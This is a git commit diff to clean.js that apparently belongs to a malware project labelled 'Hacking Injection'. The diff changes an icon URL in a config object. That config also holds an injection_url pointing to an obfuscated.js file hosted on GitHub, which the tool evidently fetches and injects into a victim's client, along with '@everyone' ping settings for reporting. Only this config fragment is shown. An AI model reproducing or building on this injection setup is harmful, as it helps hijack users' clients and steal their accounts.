23775f5da325ff1b9d39393d22f04e183d7b5009
g4zz <115455659+g4zzlove@users.noreply.github.com>
2022-12-05 06:16:47 -0300

    Update clean.js

--- clean.js
+++ clean.js
@@ -12,7 +12,7 @@ const config = {
   ping_on_run: false, 
   ping_val: '@everyone', 
   embed_name: 'Hacking Injection', 
-  embed_icon: 'https://github.com/g4zzlove/HackerPc-injection/blob/main/imgs/pfp.png', 
+  embed_icon: 'https://github.com/g4zzlove/Hacking-injection/blob/main/imgs/pfp.png', 
   embed_color: 0, 
   injection_url: 'https://raw.githubusercontent.com/g4zzlove/Hacking-injection/master/obfuscated.js', 
 
